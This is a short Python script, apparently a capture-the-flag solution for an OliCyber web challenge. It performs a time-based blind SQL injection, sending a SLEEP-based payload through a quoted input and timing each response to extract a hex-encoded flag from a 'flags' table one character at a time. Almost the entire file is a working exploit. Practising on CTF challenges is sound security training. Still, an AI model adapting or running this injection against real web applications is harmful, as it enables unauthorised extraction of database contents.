from sql_w.util.Inj import Inj
import binascii
import time

inj = Inj('http://web-17.challs.olicyber.it')
dictionary = '0123456789abcdef'

result=''
while True:
    print(f"Current result: {result}")
    for c in dictionary:
    
        question = f"1' and (select SLEEP(1) from flags where HEX(flag) LIKE '{result+c}%')='1"
        timestart=time.time()
        inj.time(question)
        finish=time.time()
        if finish-timestart >=1: # We have a match!
            result += c
            break
    else:
        break

print(f"Final result: {binascii.unhexlify(result).decode()}")
